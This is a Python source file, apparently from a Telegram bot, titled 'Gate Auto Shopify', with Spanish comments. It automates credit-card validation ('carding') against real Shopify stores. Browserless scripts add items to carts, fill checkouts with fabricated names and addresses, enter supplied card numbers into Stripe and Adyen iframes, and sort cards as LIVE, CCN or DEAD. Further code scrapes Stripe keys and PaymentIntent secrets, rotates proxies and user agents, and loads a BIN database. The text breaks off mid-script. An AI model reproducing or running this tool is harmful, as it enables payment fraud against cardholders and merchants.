"""Gate Auto Shopify — ALFA-1. Analiza tiendas Shopify y valida tarjetas via Stripe."""
from __future__ import annotations

import asyncio
import random
import re
import time
import json
import csv
import os
import sqlite3
import uuid
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import quote, urlparse, urljoin
import aiohttp
import base64
from bs4 import BeautifulSoup
import logging

logger = logging.getLogger(__name__)

DB_PATH = "series.db"

def _esc(text: str) -> str:
    """Escapa caracteres especiales de Telegram Markdown v1."""
    for ch in ("_", "*", "`", "["):
        text = text.replace(ch, "\\" + ch)
    return str(text)
GEN_RE = re.compile(r"^\s*/gen(?:@\w+)?(?:\s+(.+))?\s*$", re.IGNORECASE)

# ── Helpers proxy / Browserless (misma lógica que stripe_complete_module) ──────

def _clean(name: str) -> str:
    return (os.getenv(name) or "").strip()

def _proxy_url() -> str | None:
    host = _clean("ANALYTIC_PROXY_HOST")
    port = _clean("ANALYTIC_PROXY_PORT")
    user = _clean("ANALYTIC_PROXY_USER")
    password = _clean("ANALYTIC_PROXY_PASS")
    scheme = _clean("ANALYTIC_PROXY_SCHEME") or "http"
    if not (host and port):
        return None
    if user and password:
        return f"{scheme}://{quote(user, safe='')}:{quote(password, safe='')}@{host}:{port}"
    return f"{scheme}://{host}:{port}"

def _browserless_token() -> str | None:
    return _clean("BROWSERLESS_TOKEN") or None

def _browserless_endpoint() -> str:
    return _clean("BROWSERLESS_ENDPOINT") or "https://production-sfo.browserless.io"

async def _fetch_rendered_html(url: str) -> bytes | None:
    """HTML renderizado (JS ejecutado) vía Browserless /content."""
    token = _browserless_token()
    if not token:
        return None
    api_url = f"{_browserless_endpoint().rstrip('/')}/content"
    payload = {
        "url": url,
        "waitForNetworkIdle": {"idleTime": 500, "timeout": 6000},
        "rejectResourceTypes": ["image", "font", "media"],
        "gotoOptions": {"waitUntil": "networkidle2", "timeout": 20000},
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                api_url, params={"token": token}, json=payload,
                timeout=aiohttp.ClientTimeout(total=35),
            ) as resp:
                if resp.status == 200:
                    return await resp.read()
                logger.warning("Browserless /content respondió %d para %s", resp.status, url)
    except Exception as exc:
        logger.warning("Error Browserless /content: %s", exc)
    return None

# Procesadores soportados
_STRIPE_PROCESSORS = {"STRIPE", "SHOPIFY_PAYMENTS"}
_DIRECT_PROCESSORS = {"AUTHORIZE.NET", "BRAINTREE", "ADYEN"}
_UNSUPPORTED_PROCESSORS = {"PAYPAL", "KLARNA", "AFTERPAY", "SQUARE"}

_BL_CHECKOUT_FUNCTION = r"""
export default async ({ page, context }) => {
  const { storeUrl, variantId, card, userData } = context;

  const fill = async (selectors, value, targetPage) => {
    for (const sel of selectors) {
      const el = await targetPage.$(sel);
      if (el) { await el.click({ clickCount: 3 }); await el.type(value, { delay: 25 }); return true; }
    }
    return false;
  };

  try {
    // 1. Agregar al carrito
    const cartOk = await page.evaluate(async (url, vid) => {
      const r = await fetch(url + '/cart/add.js', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: vid, quantity: 1 }),
      });
      return r.ok;
    }, storeUrl, variantId);

    if (!cartOk) {
      return { data: { status: 'ERROR AUTH', message: 'No se pudo agregar producto al carrito' }, type: 'application/json' };
    }

    // 2. Ir al checkout
    await page.goto(storeUrl + '/checkout', { waitUntil: 'networkidle2', timeout: 30000 });
    await page.waitForSelector('input[type="email"], input[name="email"], #checkout_email', { timeout: 8000 }).catch(() => {});

    // 3. Llenar datos de contacto
    await fill(['input[type="email"]', 'input[name="email"]', '#checkout_email'], userData.email, page);
    await fill(['input[name="firstName"]', '#checkout_shipping_address_first_name', 'input[autocomplete="given-name"]'], userData.first_name, page);
    await fill(['input[name="lastName"]', '#checkout_shipping_address_last_name', 'input[autocomplete="family-name"]'], userData.last_name, page);
    await fill(['input[name="address1"]', '#checkout_shipping_address_address1', 'input[autocomplete="address-line1"]'], userData.address, page);
    await fill(['input[name="city"]', '#checkout_shipping_address_city', 'input[autocomplete="address-level2"]'], userData.city, page);
    await fill(['input[name="zip"]', '#checkout_shipping_address_zip', 'input[autocomplete="postal-code"]'], userData.postal_code, page);

    const countryEl = await page.$('select[name="country"], #checkout_shipping_address_country');
    if (countryEl) await page.select(await page.$eval('select[name="country"], #checkout_shipping_address_country', el => el.tagName === 'SELECT' ? el.getAttribute('name') || '#checkout_shipping_address_country' : null).catch(() => null) || 'select[name="country"]', userData.country).catch(() => {});

    // 4. Continuar (puede haber 2 pasos: shipping info + shipping method)
    for (let step = 0; step < 2; step++) {
      const btn = await page.$('button[type="submit"]');
      if (!btn) break;
      const txt = await page.evaluate(el => (el.textContent || '').toLowerCase(), btn);
      if (!txt.includes('pay') && !txt.includes('pagar')) {
        await btn.click();
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 12000 }).catch(() => {});
        await new Promise(r => setTimeout(r, 1500));
      } else break;
    }

    // 5. Llenar campos de pago (main page o iframe)
    await new Promise(r => setTimeout(r, 2000));
    let cardFilled = false;

    const frames = page.frames();
    for (const frame of frames) {
      const fUrl = frame.url();
      if (!fUrl || fUrl === 'about:blank') continue;
      if (fUrl.includes('stripe') || fUrl.includes('authorize') || fUrl.includes('braintree') || fUrl.includes('accept.js') || fUrl.includes('payment')) {
        const ok = await fill(['input[name*="number"]', 'input[id*="number"]', 'input[placeholder*="card"]', 'input[autocomplete="cc-number"]'], card.number, frame);
        if (ok) {
          await fill(['input[name*="exp"]', 'input[placeholder*="MM"]', 'input[autocomplete="cc-exp"]'], card.exp_month + '/' + card.exp_year.slice(-2), frame);
          await fill(['input[name*="cvv"]', 'input[name*="cvc"]', 'input[name*="security"]', 'input[autocomplete="cc-csc"]'], card.cvc, frame);
          cardFilled = true;
          break;
        }
      }
    }

    if (!cardFilled) {
      const ok = await fill(['input[name*="number"]', 'input[id*="cardnumber"]', 'input[autocomplete="cc-number"]', 'input[data-card*="number"]'], card.number, page);
      if (ok) {
        await fill(['input[name*="exp"]', 'input[placeholder*="MM/YY"]', 'input[autocomplete="cc-exp"]'], card.exp_month + '/' + card.exp_year.slice(-2), page);
        await fill(['input[name*="cvv"]', 'input[name*="cvc"]', 'input[autocomplete="cc-csc"]'], card.cvc, page);
        cardFilled = true;
      }
    }

    if (!cardFilled) {
      return { data: { status: 'ERROR AUTH', message: 'No se encontraron campos de pago', pageUrl: page.url() }, type: 'application/json' };
    }

    // 6. Submitir pago
    await new Promise(r => setTimeout(r, 500));
    const payBtn = await page.$('button[type="submit"], button[id*="pay"], button[class*="pay-button"]');
    if (payBtn) {
      await payBtn.click();
      await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 20000 }).catch(() => {});
    }
    await new Promise(r => setTimeout(r, 2000));

    const finalUrl = page.url();
    const lc = (await page.content()).toLowerCase();

    let status = 'DEAD AUTH';
    let message = 'Declined';

    if (finalUrl.includes('/thank_you') || finalUrl.includes('/thank-you') || finalUrl.includes('order_confirmed')) {
      status = 'LIVE AUTH'; message = 'Order placed successfully';
    } else if (lc.includes('insufficient funds') || lc.includes('fondos insuficientes')) {
      status = 'LIVE AUTH'; message = 'Insufficient funds (card live)';
    } else if (lc.includes('authentication') || lc.includes('3d secure') || lc.includes('3ds') || lc.includes('autenticaci')) {
      status = 'CCN AUTH'; message = '3DS requerido (posiblemente viva)';
    } else if (lc.includes('security code') || lc.includes('cvv is invalid') || lc.includes('código de seguridad')) {
      status = 'CCN AUTH'; message = 'CVV incorrecto (tarjeta existe)';
    } else if (lc.includes('your card was declined') || lc.includes('card was declined') || lc.includes('tarjeta fue rechazada')) {
      status = 'DEAD AUTH'; message = 'Card declined';
    } else if (lc.includes('card number') && (lc.includes('invalid') || lc.includes('incorrect'))) {
      status = 'DEAD AUTH'; message = 'Invalid card number';
    }

    return { data: { status, message, pageUrl: finalUrl }, type: 'application/json' };
  } catch (e) {
    return { data: { status: 'ERROR AUTH', message: String(e), pageUrl: '' }, type: 'application/json' };
  }
};
"""

_BL_STRIPE_FUNCTION = r"""
export default async ({ page, context }) => {
  const { pk, number, exp_month, exp_year, cvc, gateUrl } = context;

  // Fake data
  const fakeEmail = `user${Math.floor(Math.random() * 90000 + 10000)}@gmail.com`;
  const fake = {
    firstName: 'James', lastName: 'Carter',
    address: '742 Evergreen Terrace', city: 'Springfield',
    state: 'IL', zip: '62701'
  };

  const typeInto = async (selectors, value, pg) => {
    for (const sel of selectors) {
      try {
        const el = await pg.$(sel);
        if (el) { await el.click({ clickCount: 3 }); await el.type(value, { delay: 30 }); return true; }
      } catch (_) {}
    }
    return false;
  };

  const clickByText = async (text) => {
    const btns = await page.$$('button, [role="button"], input[type="submit"]');
    for (const btn of btns) {
      const t = await page.evaluate(el => el.textContent || el.value || '', btn).catch(() => '');
      if (t.toLowerCase().includes(text.toLowerCase())) { await btn.click().catch(() => {}); return true; }
    }
    return false;
  };

  try {
    // Interceptar respuestas Stripe antes de navegar
    let stripeResult = null;
    let resultResolve;
    const resultPromise = new Promise(res => { resultResolve = res; });

    await page.setRequestInterception(true);
    page.on('request', req => req.continue());
    page.on('response', async resp => {
      const url = resp.url();
      if (url.includes('api.stripe.com/v1/tokens') || url.includes('api.stripe.com/v1/payment_methods')) {
        try {
          const json = await resp.json().catch(() => null);
          if (json && !stripeResult) { stripeResult = json; resultResolve(json); }
        } catch (_) {}
      }
    });

    // Navegar al gate URL
    await page.goto(gateUrl, { waitUntil: 'networkidle2', timeout: 30000 }).catch(() => {});
    await new Promise(r => setTimeout(r, 1500));

    // Si no estamos en /payment, navegar el flujo de checkout
    let currentUrl = page.url();
    if (!currentUrl.includes('/payment')) {
      // Llenar email
      await typeInto(
        ['input[type="email"]', 'input[name="email"]', '#email', 'input[autocomplete="email"]'],
        fakeEmail, page
      );
      await new Promise(r => setTimeout(r, 400));

      // Seleccionar método de entrega — preferir Ship, si no hay tomar cualquiera disponible
      const shipSelectors = [
        'input[value="ship"]', 'input[id*="ship"]', 'label[for*="ship"]',
        '[data-testid*="ship"]', '[data-delivery-method="shipping"]'
      ];
      let deliverySelected = false;
      for (const sel of shipSelectors) {
        try { const el = await page.$(sel); if (el) { await el.click(); deliverySelected = true; break; } } catch (_) {}
      }
      if (!deliverySelected) {
        // Tomar el primer radio de delivery disponible
        const radios = await page.$$('input[type="radio"]');
        if (radios.length > 0) await radios[0].click().catch(() => {});
      }
      await new Promise(r => setTimeout(r, 600));

      // Click en "Continue to payment"
      const clicked = await clickByText('Continue to payment');
      if (!clicked) {
        // Fallback: primer botón submit visible
        await page.$eval('button[type="submit"]', el => el.click()).catch(() => {});
      }
      await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 20000 }).catch(() => {});
      await new Promise(r => setTimeout(r, 1500));
    }

    // Esperar iframes de Stripe Elements en la página de pago
    await page.waitForSelector(
      'iframe[name*="__privateStripeFrame"], iframe[src*="js.stripe.com"], iframe[title*="Secure card"], iframe[title*="card"]',
      { timeout: 15000 }
    ).catch(() => {});
    await new Promise(r => setTimeout(r, 1000));

    // Llenar Stripe Elements dentro de iframes
    let filled = false;
    for (const frame of page.frames()) {
      const fUrl = frame.url();
      if (!fUrl || fUrl === 'about:blank') continue;
      if (fUrl.includes('js.stripe.com') || fUrl.includes('stripe-inner') || fUrl.includes('__privateStripe')) {
        try {
          const cardInput = await frame.$(
            'input[name="cardnumber"], input[data-elements-stable-field-name="cardNumber"], input[autocomplete="cc-number"]'
          );
          if (cardInput) {
            await cardInput.click({ clickCount: 3 });
            await cardInput.type(number, { delay: 50 });
            const expInput = await frame.$(
              'input[name="exp-date"], input[data-elements-stable-field-name="cardExpiry"], input[autocomplete="cc-exp"]'
            );
            if (expInput) await expInput.type(`${exp_month}/${String(exp_year).slice(-2)}`, { delay: 30 });
            const cvcInput = await frame.$(
              'input[name="cvc"], input[data-elements-stable-field-name="cardCvc"], input[autocomplete="cc-csc"]'
            );
            if (cvcInput) await cvcInput.type(cvc, { delay: 30 });
            filled = true;
            break;
          }
        } catch (_) {}
      }
    }

    if (!filled) {
      return { data: { error: { message: 'No se encontró formulario Stripe Elements.', code: 'no_stripe_form' } }, type: 'application/json' };
    }

    // Name on card (campo en la página principal, no en iframe)
    await typeInto(
      ['input[name="name"]', 'input[autocomplete="cc-name"]', 'input[placeholder*="name" i]', 'input[id*="name" i]'],
      `${fake.firstName} ${fake.lastName}`, page
    );

    // Billing address
    await typeInto(['input[name="firstName"]', 'input[autocomplete="billing given-name"]', 'input[name="first_name"]'], fake.firstName, page);
    await typeInto(['input[name="lastName"]', 'input[autocomplete="billing family-name"]', 'input[name="last_name"]'], fake.lastName, page);
    await typeInto(['input[name="address1"]', 'input[autocomplete="billing address-line1"]', 'input[name="address"]'], fake.address, page);
    await typeInto(['input[name="city"]', 'input[autocomplete="billing address-level2"]'], fake.city, page);
    await typeInto(['input[name="zip"]', 'input[autocomplete="billing postal-code"]', 'input[name="postal_code"]'], fake.zip, page);

    // State/Province select
    try {
      const sel = await page.$('select[name="province"], select[name="state"], select[autocomplete="billing address-level1"]');
      if (sel) await page.select(sel.asElement ? sel.asElement()._remoteObject.objectId : 'select[name="province"]', fake.state).catch(() => {});
    } catch (_) {}

    await new Promise(r => setTimeout(r, 600));

    // Submit pago
    await clickByText('Pay now').catch(() => {});
    const payBtn = await page.$('button[type="submit"][aria-label*="pay" i], button[id*="pay"], button[class*="pay"], button[type="submit"]');
    if (payBtn) await payBtn.click().catch(() => {});

    // Esperar respuesta Stripe (máx 20s)
    const result = await Promise.race([
      resultPromise,
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout_stripe_response')), 20000))
    ]).catch(e => ({ error: { message: String(e), code: 'timeout' } }));

    return { data: result, type: 'application/json' };
  } catch (e) {
    return { data: { error: { message: String(e), code: 'browser_error' } }, type: 'application/json' };
  }
};
"""

_BL_ADYEN_FUNCTION = r"""
export default async ({ page, context }) => {
  const { storeUrl, variantId, card, userData } = context;

  let adyenResult = null;
  let resultResolve;
  const resultPromise = new Promise(res => { resultResolve = res; });

  try {
    await page.setRequestInterception(true);
    page.on('request', req => req.continue());
    page.on('response', async resp => {
      const url = resp.url();
      if ((url.includes('adyen.com') || url.includes('adyen')) && !adyenResult) {
        try {
          const json = await resp.json().catch(() => null);
          if (json && (json.resultCode || json.errorCode || json.refusalReason)) {
            adyenResult = json;
            resultResolve(json);
          }
        } catch (_) {}
      }
    });

    const cartOk = await page.evaluate(async (url, vid) => {
      const r = await fetch(url + '/cart/add.js', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: vid, quantity: 1 }),
      });
      return r.ok;
    }, storeUrl, variantId);

    if (!cartOk) {
      return { data: { status: 'ERROR AUTH', message: 'Cart add failed' }, type: 'application/json' };
    }

    await page.goto(storeUrl + '/checkout', { waitUntil: 'networkidle2', timeout: 30000 }).catch(() => {});
    await new Promise(r => setTimeout(r, 1500));

    const fill = async (sels, val, pg) => {
      for (const s of sels) {
        try { const el = await pg.$(s); if (el) { await el.click({ clickCount: 3 }); await el.type(val, { delay: 25 }); return true; } } catch (_) {}
      }
      return false;
    };

    await fill(['input[type="email"]', 'input[name="email"]'], userData.email, page);
    await fill(['input[name="firstName"]', '#checkout_shipping_address_first_name'], userData.first_name, page);
    await fill(['input[name="lastName"]', '#checkout_shipping_address_last_name'], userData.last_name, page);
    await fill(['input[name="address1"]', '#checkout_shipping_address_address1'], userData.address, page);
    await fill(['input[name="city"]', '#checkout_shipping_address_city'], userData.city, page);
    await fill(['input[name="zip"]', '#checkout_shipping_address_zip'], userData.postal_code, page);

    for (let step = 0; step < 2; step++) {
      const btn = await page.$('button[type="submit"]');
      if (!btn) break;
      const txt = await page.evaluate(el => (el.textContent || '').toLowerCase(), btn);
      if (!txt.includes('pay') && !txt.includes('pagar')) {
        await btn.click();
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 12000 }).catch(() => {});
        await new Promise(r => setTimeout(r, 1500));
      } else break;
    }

    await new Promise(r => setTimeout(r, 2000));

    // Llenar datos de tarjeta en Adyen Drop-in / Components
    const frames = page.frames();
    for (const frame of frames) {
      const fUrl = frame.url();
      if (fUrl && fUrl.includes('adyen')) {
        await fill(['input[data-fieldtype="encryptedCardNumber"]', 'input[autocomplete="cc-number"]', 'input[name="encryptedCardNumber"]'], card.number, frame);
        await fill(['input[data-fieldtype="encryptedExpiryDate"]', 'input[autocomplete="cc-exp"]'], card.exp_month + '/' + String(card.exp_year).slice(-2), frame);
        await fill(['input[data-fieldtype="encryptedSecurityCode"]', 'input[autocomplete="cc-csc"]'], card.cvc, frame);
        break;
      }
    }

    const payBtn = await page.$('button[type="submit"]');
    if (payBtn) {
      await payBtn.click();
      await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 20000 }).catch(() => {});
    }

    const result = await Promise.race([
      resultPromise,
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 25000))
    ]).catch(e => ({ error: String(e) }));

    let status = 'DEAD AUTH', message = 'Declined';
    const rc = (result.resultCode || '').toLowerCase();
    const finalUrl = page.url();
    if (finalUrl.includes('/thank_you') || finalUrl.includes('order_confirmed')) {
      status = 'LIVE AUTH'; message = 'Order placed';
    } else if (rc === 'authorised' || rc === 'authorized') {
      status = 'LIVE AUTH'; message = 'Adyen: Authorised';
    } else if (rc === 'refused') {
      const refusal = (result.refusalReason || result.refusalReasonCode || '').toLowerCase();
      if (refusal.includes('cvc') || refusal.includes('cvv') || refusal === '5') {
        status = 'CCN AUTH'; message = result.refusalReason || 'CVC mismatch';
      } else if (refusal.includes('insufficient') || refusal === '6') {
        status = 'LIVE AUTH'; message = 'Insufficient funds';
      } else {
        status = 'DEAD AUTH'; message = result.refusalReason || 'Refused';
      }
    } else if (result.errorCode) {
      status = 'ERROR AUTH'; message = result.errorCode + ': ' + (result.message || '');
    }

    return { data: { status, message, adyenResult: result }, type: 'application/json' };
  } catch (e) {
    return { data: { status: 'ERROR AUTH', message: String(e) }, type: 'application/json' };
  }
};
"""

async def _validate_via_browserless_stripe(
    pk: str, card_number: str, exp_month: str, exp_year: str, cvc: str, gate_url: str = ""
) -> Dict[str, Any] | None:
    token = _browserless_token()
    if not token:
        return None
    api_url = f"{_browserless_endpoint().rstrip('/')}/function"
    payload = {
        "code": _BL_STRIPE_FUNCTION,
        "context": {"pk": pk, "number": card_number, "exp_month": exp_month,
                    "exp_year": exp_year, "cvc": cvc, "gateUrl": gate_url},
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                api_url, params={"token": token}, json=payload,
                timeout=aiohttp.ClientTimeout(total=90),
            ) as resp:
                if resp.status != 200:
                    logger.warning("Browserless /function respondió %d", resp.status)
                    return None
                raw = await resp.json()
                if isinstance(raw, dict) and "data" in raw:
                    inner = raw["data"]
                    return inner if isinstance(inner, dict) else raw
                return raw if isinstance(raw, dict) else {}
    except Exception as exc:
        logger.warning("Error Browserless /function: %s", exc)
        return None

# ── Datos por país ──────────────────────────────────────────────────────────────

COUNTRY_DATA = {
    "CA": {
        "currency": "CAD",
        "names": ["Liam", "Noah", "Oliver", "Lucas", "William", "Emma", "Olivia", "Ava", "Isabella", "Sophia"],
        "last_names": ["Smith", "Johnson", "Brown", "Wilson", "Martin", "Taylor", "Anderson", "Thomas", "Lee", "Miller"],
        "cities": {
            "Toronto": ["M5A", "M5B", "M5C", "M5E", "M5G"],
            "Vancouver": ["V5K", "V6A", "V6B", "V6C", "V6E"],
            "Montreal": ["H2Y", "H3A", "H3B", "H3C", "H3E"],
            "Calgary": ["T2P", "T2R", "T2S", "T2T", "T2V"],
            "Ottawa": ["K1P", "K1R", "K1S", "K2P", "K2R"],
        },
        "address_formats": ["{number} {street} Street", "{number} {street} Avenue",
                            "Unit {unit}, {number} {street}", "{number} {street} Road"],
        "streets": ["Main", "King", "Queen", "Yonge", "Bloor", "University", "Bay", "Front", "Dundas", "College"],
        "provinces": ["ON", "BC", "QC", "AB", "NS", "MB", "SK", "NB", "NL", "PE"],
    },
    "US": {
        "currency": "USD",
        "names": ["James", "Michael", "David", "John", "Robert", "Sarah", "Emily", "Jessica", "Jennifer", "Elizabeth"],
        "last_names": ["Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis", "Garcia", "Rodriguez", "Wilson"],
        "cities": {
            "New York": ["10001", "10002", "10003", "10004", "10005"],
            "Los Angeles": ["90001", "90002", "90003", "90004", "90005"],
            "Chicago": ["60601", "60602", "60603", "60604", "60605"],
            "Miami": ["33101", "33102", "33103", "33104", "33105"],
        },
        "address_formats": ["{number} {street} Street", "{number} {street} Avenue",
                            "Apt {apt}, {number} {street}", "{number} {street} Road"],
        "streets": ["Main", "Broadway", "Park", "Oak", "Pine", "Washington", "Fifth", "Market", "Sunset", "Hollywood"],
        "states": ["NY", "CA", "IL", "FL", "TX", "AZ", "PA", "OH", "GA", "NC"],
    },
    "GB": {
        "currency": "GBP",
        "names": ["Oliver", "George", "Harry", "Jack", "Jacob", "Olivia", "Amelia", "Isla", "Ava", "Emily"],
        "last_names": ["Smith", "Jones", "Williams", "Brown", "Taylor", "Wilson", "Johnson", "Davies", "Evans", "Thomas"],
        "cities": {
            "London": ["SW1A 1AA", "EC1A 1BB", "W1A 0AX", "NW1 4RY", "SE1 8ND"],
            "Manchester": ["M1 1AA", "M2 2BB", "M3 3CC", "M4 4DD", "M5 5EE"],
            "Birmingham": ["B1 1AA", "B2 2BB", "B3 3CC", "B4 4DD", "B5 5EE"],
        },
        "address_formats": ["{number} {street} Street", "Flat {flat}, {number} {street}",
                            "{number} {street} Road", "{number} {street} Lane"],
        "streets": ["High", "Church", "Park", "King", "Queen", "Baker", "Oxford", "Regent", "Bond", "Fleet"],
        "counties": ["Greater London", "Greater Manchester", "West Midlands", "Merseyside", "West Yorkshire"],
    },
}

GENERIC_DATA = COUNTRY_DATA["US"]

# ── Gestores auxiliares ─────────────────────────────────────────────────────────

class ProxyManager:
    def __init__(self):
        self.failed_proxies: set = set()

    def get_proxy(self) -> str | None:
        return _proxy_url()

    def mark_failed(self, proxy: str):
        self.failed_proxies.add(proxy)

    def mark_success(self, proxy: str):
        self.failed_proxies.discard(proxy)


class UserAgentManager:
    def __init__(self):
        self._agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        ]

    def get_random(self) -> str:
        return random.choice(self._agents)


class SeriesManager:
    def __init__(self, db_path: str = DB_PATH):
        self.db_path = db_path
        self._init_db()

    def _init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS series (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    texto TEXT NOT NULL,
                    published INTEGER DEFAULT 0,
                    published_at TEXT,
                    telegram_message_id INTEGER
                )
            """)
            columns = [r[1] for r in conn.execute("PRAGMA table_info(series)").fetchall()]
            for col, definition in [("published", "INTEGER DEFAULT 0"),
                                     ("published_at", "TEXT"),
                                     ("telegram_message_id", "INTEGER")]:
                if col not in columns:
                    conn.execute(f"ALTER TABLE series ADD COLUMN {col} {definition}")
            conn.commit()

    def extract_gen_text(self, message_text: str) -> str | None:
        if not message_text:
            return None
        first_line = message_text.splitlines()[0]
        match = GEN_RE.match(first_line)
        if not match:
            return None
        texto = (match.group(1) or "").strip()
        return texto[:500] if texto else None

    def save_series_text(self, texto: str) -> None:
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("INSERT INTO series (texto) VALUES (?)", (texto,))
            conn.commit()

    def get_next_unpublished_series(self, limit: int = 1) -> List[Tuple[int, str]]:
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.execute(
                "SELECT id, texto FROM series WHERE published = 0 ORDER BY id ASC LIMIT ?", (limit,)
            )
            return cursor.fetchall()

    def mark_series_as_published(self, series_id: int, telegram_message_id: int | None = None) -> None:
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "UPDATE series SET published=1, published_at=?, telegram_message_id=? WHERE id=?",
                (datetime.now(timezone.utc).isoformat(), telegram_message_id, series_id),
            )
            conn.commit()


# ── Gate Manager ────────────────────────────────────────────────────────────────

class ShopifyGateManager:
    """Analiza tiendas Shopify y valida tarjetas vía Stripe (con fallback Browserless)."""

    # Patrones Stripe pk_ (mismo set que stripe_complete_module)
    _STRIPE_PATTERNS = [
        (r"pk_live_[A-Za-z0-9_]+", "Clave pública live"),
        (r"pk_test_[A-Za-z0-9_]+", "Clave pública test"),
        (r"stripe\.com", "Dominio Stripe"),
        (r"stripe-js", "Librería Stripe JS"),
        (r"Stripe\(", "Constructor Stripe"),
        (r"checkout\.stripe\.com", "Checkout Stripe"),
    ]

    def __init__(self):
        self.current_gate: str | None = None
        self.gate_config: Dict[str, Any] = {}
        self.proxy_manager = ProxyManager()
        self.ua_manager = UserAgentManager()
        self.series_manager = SeriesManager()
        self._bin_database = self._load_bin_database()
        self.request_stats = {
            "total_requests": 0, "successful_requests": 0,
            "failed_requests": 0, "last_request_time": None,
        }

    def _load_bin_database(self) -> Dict[str, Dict[str, str]]:
        db: Dict[str, Dict[str, str]] = {}
        csv_path = os.path.join(os.path.dirname(__file__), "tarjetas.csv")
        if not os.path.exists(csv_path):
            logger.warning("tarjetas.csv no encontrado en %s", csv_path)
            return db
        try:
            with open(csv_path, "r", encoding="utf-8", errors="replace") as f:
                reader = csv.DictReader(f)
                for row in reader:
                    b = row.get("bin", "").strip()
                    if b:
                        db[b] = {
                            "brand": row.get("brand", "UNKNOWN"),
                            "type": row.get("tipo", "UNKNOWN"),
                            "level": row.get("nivel", "STANDARD"),
                            "bank": row.get("Banco", "UNKNOWN"),
                            "phone": row.get("teléfono", ""),
                            "country": row.get("país", "UNKNOWN"),
                        }
            logger.info("BIN DB cargada: %d registros", len(db))
        except Exception as exc:
            logger.error("Error cargando tarjetas.csv: %s", exc)
        return db

    async def _fetch_checkout_client_secret(self) -> str | None:
        """
        Agrega el producto más barato al carrito, navega al checkout y extrae
        el client_secret de PaymentIntent. Intenta HTTP primero; si el checkout
        es un SPA (new-style /checkouts/cn/), usa Browserless para renderizar el JS.
        """
        if not self.current_gate:
            return None
        parsed = urlparse(self.current_gate)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        variant = await self._get_cheapest_variant(base_url)
        if not variant:
            return None
        proxy = _proxy_url()
        headers = {
            "User-Agent": self.ua_manager.get_random(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        kw: Dict[str, Any] = {"timeout": aiohttp.ClientTimeout(total=20), "allow_redirects": True}
        if proxy:
            kw["proxy"] = proxy

        checkout_url = f"{base_url}/checkout"
        try:
            async with aiohttp.ClientSession(headers=headers) as sess:
                await sess.post(
                    f"{base_url}/cart/add.js",
                    json={"id": variant["variant_id"], "quantity": 1},
                    headers={**headers, "Content-Type": "application/json"},
                    **kw,
                )
                resp = await sess.get(checkout_url, **kw)
                html = await resp.text()
                checkout_url = str(resp.url)  # URL final tras redirección
                secret = self._extract_client_secret(html)
                if secret:
                    acct = self._extract_stripe_account(html)
                    if acct and not self.gate_config.get("stripe_account"):
                        self.gate_config["stripe_account"] = acct
                    return secret
        except Exception as exc:
            logger.warning("Error HTTP checkout: %s", exc)

        # New-style checkout (/checkouts/cn/) es SPA — el PI se inyecta via JS.
        # Usar Browserless para interceptar la respuesta de la API de Shopify que
        # contiene el client_secret.
        token = _browserless_token()
        if not token:
            return None

        bl_code = r"""
export default async ({ page, context }) => {
  const { cartUrl, variantId, checkoutUrl } = context;
  let clientSecret = null;
  let stripeAccount = null;

  await page.setRequestInterception(true);
  page.on('request', req => req.continue());
  page.on('response', async resp => {
    if (clientSecret) return;
    const url = resp.url();
    try {
      const ct = resp.headers()['content-type'] || '';
      if (ct.includes('json')) {
        const txt = await resp.text().catch(() => '');
        const m = txt.match(/pi_[A-Za-z0-9]+_secret_[A-Za-z0-9]+/);
        if (m) clientSecret = m[0];
        const a = txt.match(/acct_[A-Za-z0-9]+/);
        if (a) stripeAccount = a[0];
      }
    } catch (_) {}
  });

  // Agregar al carrito
  await page.evaluate(async (url, vid) => {
    await fetch(url + '/cart/add.js', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: vid, quantity: 1 }),
    });
  }, cartUrl, variantId);

  // Navegar al checkout
  await page.goto(cartUrl + '/checkout', { waitUntil: 'networkidle2', timeout: 30000 }).catch(() => {});

  // Esperar hasta 15s a que aparezca el client_secret en el DOM o en requests
  for (let i = 0; i < 30 && !clientSecret; i++) {
    await new Promise(r => setTimeout(r, 500));
    // Buscar también en el HTML renderizado
    const html = await page.content().catch(() => '');
    const m = html.match(/pi_[A-Za-z0-9]+_secret_[A-Za-z0-9]+/);
